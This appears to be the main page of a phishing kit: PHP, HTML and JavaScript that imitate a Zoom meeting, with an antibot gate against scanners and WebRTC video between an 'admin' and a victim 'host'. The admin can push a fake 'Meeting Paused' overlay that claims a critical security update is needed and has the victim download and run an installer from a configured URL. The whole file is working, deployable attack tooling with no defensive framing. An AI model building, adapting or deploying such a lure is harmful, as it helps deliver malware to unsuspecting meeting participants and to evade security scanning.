<?php
require_once __DIR__ . '/antibot.php';
require_once __DIR__ . '/config.php';

$m    = preg_replace('/[^0-9\-]/', '', $_GET['m']    ?? '');
$role = in_array($_GET['role'] ?? '', ['admin','host']) ? $_GET['role'] : '';
$pass = $_GET['p']     ?? '';
$email= htmlspecialchars($_GET['email'] ?? '');

$file = $m ? zm_meet_file($m) : null;
$meet = ($file && file_exists($file)) ? zm_load($file) : null;

// Admin with correct password → skip antibot (password IS the credential)
// Host → cookie already set from join.php; if not, run full challenge
$adminValid = ($role === 'admin' && $meet && $pass === ($meet['password'] ?? ''));
if (!$adminValid) {
    antibot_protect();
} else {
    // Admin proved identity via password — issue the clearance cookie now so
    // every subsequent fetch() to api/signal.php and api/event.php passes the
    // antibot_protect_api() cookie check without being blocked.
    if (!ab_cookie_valid()) {
        ab_set_cookie(hash('sha256', uniqid('adm_', true)));
    }
}

$pass = htmlspecialchars($pass);

// Validate admin password
if ($role === 'admin' && $meet && $pass !== $meet['password']) {
    $meet = null; // wrong password
}
// Validate host has email param
if ($role === 'host' && !$email) {
    header('Location: join.php?m=' . urlencode($m)); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Zoom Meeting<?= $m ? ' — ' . htmlspecialchars($m) : '' ?></title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
:root{
  --bg:#1c1c1e;--surface:#2c2c2e;--card:#3a3a3c;
  --blue:#2d8cff;--red:#f44;--green:#3dba6f;--orange:#ff9f0a;
  --text:#fff;--muted:#888;
}
body{background:var(--bg);color:var(--text);font-family:"Segoe UI",Arial,sans-serif;
  height:100vh;overflow:hidden;display:flex;flex-direction:column;}

/* ── Invalid / error ── */
.fatal{display:flex;align-items:center;justify-content:center;height:100vh;
  flex-direction:column;gap:14px;text-align:center;padding:20px;}
.fatal h2{font-size:1.3rem;}
.fatal p{color:var(--muted);font-size:.9rem;}

/* ── Header ── */
#header{
  background:#111;border-bottom:1px solid #333;
  padding:10px 20px;display:flex;align-items:center;gap:14px;flex-shrink:0;
  height:52px;
}
.hdr-logo{background:var(--blue);color:#fff;width:30px;height:30px;border-radius:7px;
  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;}
.hdr-id{font-family:monospace;font-size:.95rem;color:#ccc;letter-spacing:.05em;}
.hdr-right{margin-left:auto;display:flex;align-items:center;gap:12px;}
#timer{font-family:monospace;font-size:.9rem;color:#aaa;}
.role-badge{font-size:.7rem;font-weight:700;padding:3px 8px;border-radius:20px;}
.role-badge.admin{background:var(--orange);color:#000;}
.role-badge.host{background:var(--green);color:#000;}
#conn-status{font-size:.72rem;color:var(--muted);display:flex;align-items:center;gap:5px;}
.conn-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);}
.conn-dot.connected{background:var(--green);box-shadow:0 0 5px var(--green);}
.conn-dot.connecting{background:var(--orange);animation:blink 1s infinite;}
.conn-dot.waiting{background:#555;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}

/* ── Video area ── */
#videos{
  flex:1;display:flex;align-items:center;justify-content:center;
  gap:16px;padding:20px;background:#111;min-height:0;
}
.video-wrap{
  position:relative;border-radius:12px;overflow:hidden;background:#000;
  flex:1;max-width:640px;aspect-ratio:16/9;max-height:calc(100vh - 160px);
}
.video-wrap video{width:100%;height:100%;object-fit:cover;display:block;}
.video-label{
  position:absolute;bottom:10px;left:12px;
  background:rgba(0,0,0,.6);color:#fff;font-size:.78rem;font-weight:600;
  padding:4px 10px;border-radius:20px;
}
.video-avatar{
  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
  background:#222;flex-direction:column;gap:8px;
}
.avatar-circle{width:72px;height:72px;border-radius:50%;background:#444;
  display:flex;align-items:center;justify-content:center;font-size:2rem;}
.avatar-name{font-size:.8rem;color:#aaa;}
.cam-off-icon{
  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
  font-size:2.5rem;opacity:.35;
}
.mic-indicator{
  position:absolute;top:10px;right:12px;
  background:rgba(0,0,0,.6);padding:4px 8px;border-radius:20px;font-size:.7rem;
}

/* ── Controls ── */
#controls{
  background:#111;border-top:1px solid #333;
  padding:12px 20px;display:flex;align-items:center;justify-content:center;
  gap:12px;flex-shrink:0;height:70px;
}
.ctrl-btn{
  background:#2c2c2e;border:none;color:#fff;
  width:52px;height:52px;border-radius:50%;font-size:1.2rem;
  cursor:pointer;display:flex;align-items:center;justify-content:center;
  transition:background .15s;position:relative;
}
.ctrl-btn:hover{background:#3a3a3c;}
.ctrl-btn.off{background:#444;color:#888;}
.ctrl-btn.red{background:var(--red);}
.ctrl-btn .ctrl-label{
  position:absolute;bottom:-20px;left:50%;transform:translateX(-50%);
  font-size:.6rem;white-space:nowrap;color:#888;
}
.push-update-btn{
  background:linear-gradient(135deg,#ff6b00,#ff9f0a);
  color:#000;font-weight:700;border:none;border-radius:10px;
  padding:10px 18px;font-size:.82rem;cursor:pointer;
  display:flex;align-items:center;gap:6px;
  transition:opacity .15s;margin-left:auto;
}
.push-update-btn:hover{opacity:.85;}

/* ── Update overlay ── */
#updateOverlay{
  display:none;position:fixed;inset:0;z-index:1000;
  background:rgba(0,0,0,.88);
  align-items:center;justify-content:center;flex-direction:column;
  padding:20px;text-align:center;
}
#updateOverlay.visible{display:flex;}
.update-modal{
  background:#1e1e1e;border:2px solid var(--orange);border-radius:16px;
  padding:40px 36px;max-width:500px;width:100%;
}
.update-icon{font-size:3.5rem;margin-bottom:16px;animation:shake .6s ease infinite alternate;}
@keyframes shake{0%{transform:rotate(-5deg)}100%{transform:rotate(5deg)}}
.update-title{font-size:1.5rem;font-weight:800;color:var(--orange);margin-bottom:10px;}
.update-sub{color:#aaa;font-size:.9rem;margin-bottom:28px;line-height:1.6;}
.update-dl-btn{
  display:inline-flex;align-items:center;gap:8px;
  background:var(--orange);color:#000;font-weight:800;font-size:1rem;
  border:none;border-radius:10px;padding:14px 28px;cursor:pointer;
  width:100%;justify-content:center;transition:opacity .15s;
}
.update-dl-btn:hover{opacity:.85;}
.update-steps{
  background:#111;border-radius:8px;padding:14px 16px;margin-bottom:24px;
  text-align:left;font-size:.82rem;color:#ccc;line-height:2;
}
.update-steps li{list-style:none;display:flex;gap:8px;align-items:flex-start;}
.step-num{
  background:var(--orange);color:#000;width:20px;height:20px;border-radius:50%;
  font-size:.65rem;font-weight:800;display:flex;align-items:center;justify-content:center;
  flex-shrink:0;margin-top:2px;
}

/* ── Waiting screen ── */
#waitScreen{
  position:fixed;inset:0;background:#111;z-index:500;
  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
}
#waitScreen.hidden{display:none;}
.wait-ring{
  width:60px;height:60px;border:4px solid #333;
  border-top:4px solid var(--blue);border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
.wait-title{font-size:1.1rem;font-weight:700;}
.wait-sub{font-size:.82rem;color:var(--muted);}
</style>
</head>
<body>

<?php if (!$meet || !$role): ?>
<div class="fatal">
  <div style="font-size:3rem;">🔒</div>
  <h2><?= !$m ? 'No meeting specified' : 'Meeting not found' ?></h2>
  <p><?= $role === 'admin' ? 'Invalid meeting password.' : 'Please use a valid invite link.' ?></p>
</div>
<?php elseif ($meet['status'] === 'ended'): ?>
<div class="fatal">
  <div style="font-size:3rem;">✅</div>
  <h2>Meeting Ended</h2>
  <p>This meeting has ended. You may close this window.</p>
</div>
<?php else: ?>

<!-- Waiting Screen -->
<div id="waitScreen">
  <div class="wait-ring"></div>
  <div class="wait-title" id="waitTitle">
    <?= $role === 'admin' ? 'Starting meeting…' : 'Joining meeting…' ?>
  </div>
  <div class="wait-sub" id="waitSub">Requesting camera and microphone access</div>
</div>

<!-- Header -->
<div id="header">
  <div class="hdr-logo">Z</div>
  <span class="hdr-id"><?= htmlspecialchars($m) ?></span>
  <span class="role-badge <?= $role ?>"><?= strtoupper($role) ?></span>
  <div id="conn-status">
    <span class="conn-dot waiting" id="connDot"></span>
    <span id="connText">Waiting</span>
  </div>
  <div class="hdr-right">
    <span id="timer">00:00</span>
  </div>
</div>

<!-- Videos -->
<div id="videos">
  <div class="video-wrap" id="localWrap">
    <video id="localVideo" autoplay muted playsinline></video>
    <div class="video-avatar" id="localAvatar">
      <div class="avatar-circle">👤</div>
      <div class="avatar-name"><?= $role === 'admin' ? 'You (Admin)' : htmlspecialchars($email) ?></div>
    </div>
    <div class="video-label"><?= $role === 'admin' ? 'You (Admin)' : htmlspecialchars($email) ?></div>
    <div class="mic-indicator" id="localMic">🎙</div>
  </div>

  <div class="video-wrap" id="remoteWrap">
    <video id="remoteVideo" autoplay playsinline></video>
    <div class="video-avatar" id="remoteAvatar">
      <div class="avatar-circle" id="remoteIcon">👤</div>
      <div class="avatar-name" id="remoteName">
        <?= $role === 'admin' ? 'Waiting for host…' : 'Waiting for admin…' ?>
      </div>
    </div>
    <div class="video-label" id="remoteLabel">
      <?= $role === 'admin' ? 'Host' : 'Admin' ?>
    </div>
    <div class="mic-indicator" id="remoteMic">🎙</div>
  </div>
</div>

<!-- Controls -->
<div id="controls">
  <button class="ctrl-btn" id="muteBtn" onclick="toggleMute()" title="Mute/Unmute">
    🎙
    <span class="ctrl-label">Mute</span>
  </button>
  <button class="ctrl-btn" id="camBtn" onclick="toggleCam()" title="Camera On/Off">
    📹
    <span class="ctrl-label">Video</span>
  </button>
  <button class="ctrl-btn red" onclick="endCall()" title="End Call" style="margin:0 12px;">
    📵
    <span class="ctrl-label">End</span>
  </button>
  <?php if ($role === 'admin'): ?>
  <button class="push-update-btn" id="pushUpdateBtn" onclick="adminPushUpdate()">
    ⚡ Push Update Notification
  </button>
  <?php endif; ?>
</div>

<!-- Update Notification Overlay -->
<div id="updateOverlay">
  <div class="update-modal">
    <div class="update-icon">⚠️</div>
    <div class="update-title">Meeting Paused</div>
    <div class="update-sub">
      Your Zoom client requires a critical security update before this meeting can continue.<br>
      <strong>Please update now to rejoin.</strong>
    </div>
    <ul class="update-steps">
      <li><span class="step-num">1</span> Click <b>Download Update</b> below</li>
      <li><span class="step-num">2</span> Run the installer when it downloads</li>
      <li><span class="step-num">3</span> Reopen Zoom and rejoin the meeting</li>
    </ul>
    <button class="update-dl-btn" onclick="downloadUpdate()">
      ⬇ Download Update
    </button>
  </div>
</div>

<script>
// ── Config ────────────────────────────────────────────────────────────────────
const MEETING_ID = <?= json_encode($m) ?>;
const ROLE       = <?= json_encode($role) ?>;
const SELF_EMAIL = <?= json_encode($email) ?>;
const MEET_PASS  = <?= json_encode($role === 'admin' && $meet ? $meet['password'] : '') ?>;
const API_BASE   = 'api/';
const DL_URL     = <?= json_encode(DOWNLOAD_URL) ?>;

// Multiple STUN servers for maximum NAT traversal reliability
const ICE_CONFIG = {
  iceServers: [
    { urls: ['stun:stun.l.google.com:19302',
             'stun:stun1.l.google.com:19302',
             'stun:stun2.l.google.com:19302',
             'stun:stun3.l.google.com:19302'] },
    { urls: 'stun:stun.cloudflare.com:3478' },
    { urls: 'stun:stun.nextcloud.com:443'   },
  ],
  iceCandidatePoolSize: 10,
  bundlePolicy:  'max-bundle',
  rtcpMuxPolicy: 'require',
};

// ── Timing constants ──────────────────────────────────────────────────────────
const OFFER_INTERVAL    = 6000;  // ms admin re-offers when not yet connected
const ICE_DISC_WAIT     = 5000;  // ms to wait before acting on 'disconnected'
const POLL_FAST_MS      = 450;   // signal poll when connecting
const POLL_SLOW_MS      = 2500;  // signal poll when connected
const MAX_RECONNECTS    = 12;

// ── State ─────────────────────────────────────────────────────────────────────
let localStream        = null;
let pc                 = null;
let muted              = false;
let camOff             = false;
let callStarted        = false;
let timerSec           = 0;
let timerInterval      = null;
let pollInterval       = null;
let evtInterval        = null;
let updateShown        = false;
let iceBuf             = [];     // buffer ICE until remote SDP is set
let remoteSdpSet       = false;
let isShuttingDown     = false;
let reconnectCount     = 0;
let offerTimer         = null;   // admin: periodic re-offer until connected
let iceDiscTimer       = null;   // delay before acting on ICE 'disconnected'
let pollActive         = false;  // guard against concurrent polls

// ── DOM refs ──────────────────────────────────────────────────────────────────
const localVideo   = document.getElementById('localVideo');
const remoteVideo  = document.getElementById('remoteVideo');
const localAvatar  = document.getElementById('localAvatar');
const remoteAvatar = document.getElementById('remoteAvatar');
const waitScreen   = document.getElementById('waitScreen');
const connDot      = document.getElementById('connDot');
const connText     = document.getElementById('connText');
const muteBtn      = document.getElementById('muteBtn');
const camBtn       = document.getElementById('camBtn');

// ── UI helpers ────────────────────────────────────────────────────────────────
function setWait(title, sub) {
  document.getElementById('waitTitle').textContent = title;
  document.getElementById('waitSub').textContent   = sub;
}
function hideWait() { waitScreen.classList.add('hidden'); }
function showWait(title, sub) { setWait(title, sub); waitScreen.classList.remove('hidden'); }

function setConn(state, label) {
  connDot.className    = 'conn-dot ' + state;
  connText.textContent = label || state.charAt(0).toUpperCase() + state.slice(1);
}

function startTimer() {
  if (timerInterval) return;
  timerInterval = setInterval(() => {
    timerSec++;
    const mm = String(Math.floor(timerSec / 60)).padStart(2, '0');
    const ss = String(timerSec % 60).padStart(2, '0');
    document.getElementById('timer').textContent = mm + ':' + ss;
  }, 1000);
}

function setPollSpeed(fast) {
  clearInterval(pollInterval);
  pollInterval = setInterval(pollSignals, fast ? POLL_FAST_MS : POLL_SLOW_MS);
}

// ── Signaling ─────────────────────────────────────────────────────────────────
async function sig(data) {
  try {
    await fetch(API_BASE + 'signal.php?m=' + MEETING_ID, {
      method:  'POST',
      headers: {'Content-Type': 'application/json'},
      body:    JSON.stringify({...data, role: ROLE, m: MEETING_ID}),
    });
  } catch (e) {}
}

async function pollSignals() {
  if (pollActive || isShuttingDown) return;
  pollActive = true;
  try {
    const r = await fetch(
      API_BASE + 'signal.php?m=' + MEETING_ID + '&role=' + ROLE + '&t=' + Date.now()
    );
    if (!r.ok) { pollActive = false; return; }
    const d = await r.json();
    if (d.ok && d.signals.length) {
      for (const s of d.signals) await handleSignal(s);
    }
  } catch (e) {}
  pollActive = false;
}

async function pollEvents() {
  if (isShuttingDown) return;
  try {
    const r = await fetch(API_BASE + 'event.php?m=' + MEETING_ID + '&t=' + Date.now());
    const d = await r.json();
    if (!d.ok) return;

    if (d.update_push && !updateShown) {
      updateShown = true;
      showUpdateOverlay();
    }
    if (!d.update_push && updateShown && ROLE === 'admin') {
      updateShown = false;
      document.getElementById('updateOverlay').classList.remove('visible');
    }
    // Show "meeting ended" overlay — NEVER reload the page
    if (d.status === 'ended' && ROLE !== 'admin') {
      showMeetingEnded();
    }
  } catch (e) {}
}

function showMeetingEnded() {
  if (isShuttingDown) return;
  cleanup();
  document.body.innerHTML =
    `<div class="fatal">
       <div style="font-size:3rem">✅</div>
       <h2>Meeting Ended</h2>
       <p>The admin has ended this meeting. You may close this window.</p>
     </div>`;
}

function showUpdateOverlay() {
  document.getElementById('updateOverlay').classList.add('visible');
  try { new Audio('../audio/recording-start.mp3').play(); } catch (e) {}
}
function downloadUpdate() { window.open(DL_URL, '_blank'); }

// ── WebRTC core ───────────────────────────────────────────────────────────────
function destroyPC() {
  if (!pc) return;
  pc.onicecandidate             = null;
  pc.ontrack                    = null;
  pc.oniceconnectionstatechange = null;
  pc.onconnectionstatechange    = null;
  try { pc.close(); } catch (e) {}
  pc           = null;
  remoteSdpSet = false;
  iceBuf       = [];
}

function createPC() {
  destroyPC();
  pc = new RTCPeerConnection(ICE_CONFIG);

  if (localStream) localStream.getTracks().forEach(t => pc.addTrack(t, localStream));

  const remoteStream = new MediaStream();
  remoteVideo.srcObject = remoteStream;

  pc.ontrack = (e) => {
    remoteStream.addTrack(e.track);
    remoteAvatar.style.display = 'none';
    markConnected();
  };

  pc.onicecandidate = (e) => {
    if (e.candidate) sig({type: 'ice', data: JSON.stringify(e.candidate)});
  };

  pc.oniceconnectionstatechange = () => {
    if (isShuttingDown) return;
    const s = pc ? pc.iceConnectionState : '';

    if (s === 'connected' || s === 'completed') {
      clearTimeout(iceDiscTimer);
      markConnected();

    } else if (s === 'checking') {
      setConn('connecting');

    } else if (s === 'disconnected') {
      setConn('connecting', 'Reconnecting…');
      // Give the browser a few seconds to self-heal before we intervene
      clearTimeout(iceDiscTimer);
      iceDiscTimer = setTimeout(() => {
        if (pc && pc.iceConnectionState === 'disconnected') {
          triggerReconnect('ICE disconnected');
        }
      }, ICE_DISC_WAIT);

    } else if (s === 'failed') {
      clearTimeout(iceDiscTimer);
      triggerReconnect('ICE failed');

    } else if (s === 'closed') {
      if (!isShuttingDown) setConn('waiting');
    }
  };

  pc.onconnectionstatechange = () => {
    if (isShuttingDown || !pc) return;
    if (pc.connectionState === 'connected') markConnected();
    if (pc.connectionState === 'failed')    triggerReconnect('connection failed');
  };

  return pc;
}

function markConnected() {
  clearTimeout(offerTimer);
  clearTimeout(iceDiscTimer);
  reconnectCount = 0;
  setConn('connected');
  hideWait();
  setPollSpeed(false); // slow down polling — less overhead while live
  if (!callStarted) { callStarted = true; startTimer(); }
}

// ── Reconnection logic ────────────────────────────────────────────────────────
async function triggerReconnect(reason) {
  if (isShuttingDown) return;
  if (reconnectCount >= MAX_RECONNECTS) {
    setConn('waiting', 'Connection lost');
    showWait('Connection lost', 'Unable to reconnect. Please refresh the page.');
    return;
  }
  reconnectCount++;
  callStarted  = false;       // re-arm timer for the new connection
  setConn('connecting', 'Reconnecting…');

  // Show remote avatar (peer is gone)
  remoteAvatar.style.display = 'flex';
  document.getElementById('remoteName').textContent =
    ROLE === 'admin' ? 'Waiting for host…' : 'Reconnecting…';

  setPollSpeed(true); // fast polling during reconnect

  if (ROLE === 'admin') {
    await adminOffer(); // creates fresh PC + sends new offer
  } else {
    // Ask admin to send a fresh offer
    await sig({type: 'reoffer_request', data: '1'});
  }
}

// ── Signal processing ─────────────────────────────────────────────────────────
async function flushIceBuf() {
  for (const c of iceBuf) {
    try { await pc.addIceCandidate(new RTCIceCandidate(JSON.parse(c))); } catch (e) {}
  }
  iceBuf = [];
}

async function handleSignal(s) {
  if (isShuttingDown) return;

  // ── Host asking admin to re-offer ──────────────────────────────────────────
  if (s.type === 'reoffer_request' && ROLE === 'admin') {
    callStarted  = false;
    await adminOffer();
    return;
  }

  // ── Offer (admin → host): always a fresh handshake ────────────────────────
  if (s.type === 'offer') {
    createPC(); // wipes old PC, fresh slate
    try {
      await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(s.data)));
      remoteSdpSet = true;
      await flushIceBuf();
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      await sig({type: 'answer', data: JSON.stringify(answer)});
      setConn('connecting');
      hideWait();
    } catch (e) { console.error('[Signal] offer handling error', e); }
    return;
  }

  // ── Answer (host → admin) ─────────────────────────────────────────────────
  if (s.type === 'answer') {
    if (pc && !pc.remoteDescription) {
      try {
        await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(s.data)));
        remoteSdpSet = true;
        await flushIceBuf();
        setConn('connecting');
        hideWait();
      } catch (e) { console.error('[Signal] answer handling error', e); }
    }
    return;
  }

  // ── ICE candidate ─────────────────────────────────────────────────────────
  if (s.type === 'ice') {
    if (remoteSdpSet && pc) {
      try { await pc.addIceCandidate(new RTCIceCandidate(JSON.parse(s.data))); } catch (e) {}
    } else {
      iceBuf.push(s.data);
    }
  }
}

// ── Admin offer (creates PC + offer, schedules retry until connected) ─────────
async function adminOffer() {
  if (isShuttingDown) return;
  clearTimeout(offerTimer);
  createPC();
  try {
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    await sig({type: 'offer', data: JSON.stringify(offer)});
    setConn('waiting');
  } catch (e) { console.error('[Admin] offer error', e); }

  // Schedule another offer if the host hasn't answered by then
  offerTimer = setTimeout(async () => {
    if (!callStarted && !isShuttingDown) {
      await adminOffer(); // recurse — keeps offering until connected
    }
  }, OFFER_INTERVAL);
}

// ── Cleanup ───────────────────────────────────────────────────────────────────
function cleanup() {
  isShuttingDown = true;
  clearInterval(pollInterval);
  clearInterval(evtInterval);
  clearInterval(timerInterval);
  clearTimeout(offerTimer);
  clearTimeout(iceDiscTimer);
  destroyPC();
  if (localStream) localStream.getTracks().forEach(t => t.stop());
}

// ── Camera / mic controls ─────────────────────────────────────────────────────
function toggleMute() {
  if (!localStream) return;
  muted = !muted;
  localStream.getAudioTracks().forEach(t => t.enabled = !muted);
  muteBtn.textContent = muted ? '🔇' : '🎙';
  muteBtn.querySelector('.ctrl-label').textContent = muted ? 'Unmute' : 'Mute';
  muteBtn.classList.toggle('off', muted);
  document.getElementById('localMic').textContent = muted ? '🔇' : '🎙';
}
function toggleCam() {
  if (!localStream) return;
  camOff = !camOff;
  localStream.getVideoTracks().forEach(t => t.enabled = !camOff);
  camBtn.textContent = camOff ? '🚫' : '📹';
  camBtn.querySelector('.ctrl-label').textContent = camOff ? 'Start Video' : 'Video';
  camBtn.classList.toggle('off', camOff);
  localAvatar.style.display = camOff ? 'flex' : 'none';
}
function endCall() {
  if (!confirm('Leave this meeting?')) return;
  cleanup();
  document.body.innerHTML =
    `<div class="fatal">
       <div style="font-size:3rem">✅</div>
       <h2>You left the meeting</h2>
       <p>You may now close this window.</p>
     </div>`;
}

// ── Admin push update ─────────────────────────────────────────────────────────
async function adminPushUpdate() {
  const btn = document.getElementById('pushUpdateBtn');
  if (!btn) return;
  const isActive = btn.dataset.active === '1';

  const fd = new FormData();
  fd.append('m', MEETING_ID);
  fd.append('action', isActive ? 'cancel' : 'push');
  fd.append('p', MEET_PASS);

  if (isActive) {
    if (!confirm('Cancel the update notification?')) return;
  } else {
    if (!confirm('Push "Meeting Paused – Update Required" to all participants?')) return;
  }

  try {
    const r = await fetch(API_BASE + 'event.php', {method: 'POST', body: fd});
    const d = await r.json();
    if (!d.ok) { alert('Error: ' + (d.msg || 'unknown')); return; }

    if (isActive) {
      btn.innerHTML        = '⚡ Push Update Notification';
      btn.dataset.active   = '0';
      btn.style.background = 'linear-gradient(135deg,#ff6b00,#ff9f0a)';
      btn.style.color      = '#000';
      updateShown = false;
      document.getElementById('updateOverlay').classList.remove('visible');
    } else {
      btn.innerHTML        = '❌ Cancel Update Push';
      btn.dataset.active   = '1';
      btn.style.background = '#333';
      btn.style.color      = '#888';
      showUpdateOverlay();
    }
  } catch (e) { alert('Network error'); }
}

// ── Init ──────────────────────────────────────────────────────────────────────
async function init() {
  setWait('Starting…', 'Requesting camera & microphone access');
  setConn('waiting');

  // Request camera + mic; fall back to audio-only; allow mic-less start
  try {
    localStream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
  } catch (e) {
    try { localStream = await navigator.mediaDevices.getUserMedia({video: false, audio: true}); }
    catch (e2) { localStream = null; }
  }

  if (localStream) {
    if (localStream.getVideoTracks().length) {
      localVideo.srcObject     = localStream;
      localAvatar.style.display = 'none';
    } else {
      camOff = true;
      camBtn.classList.add('off');
      camBtn.textContent = '🚫';
    }
  }

  if (ROLE === 'admin') {
    setWait('Waiting for host…', 'Share the host invite link to bring someone in');
    await adminOffer(); // starts the re-offer loop automatically
  } else {
    createPC();
    setConn('waiting');
    hideWait(); // show room; remote tile says "Waiting for admin…"
  }

  // Start signal + event polling
  setPollSpeed(true); // fast while connecting
  evtInterval = setInterval(pollEvents, 2000);
  pollEvents(); // immediate first check
}

init();
</script>
<?php endif; ?>
</body>
</html>
